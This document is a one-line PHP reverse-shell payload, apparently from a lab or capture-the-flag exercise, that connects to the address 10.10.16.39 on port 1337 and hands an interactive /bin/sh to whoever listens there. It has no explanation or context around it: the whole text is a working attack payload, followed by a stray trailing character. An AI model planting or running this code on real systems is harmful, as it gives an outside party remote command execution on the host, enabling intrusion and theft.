<?php $sock=fsockopen("10.10.16.39",1337);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>i


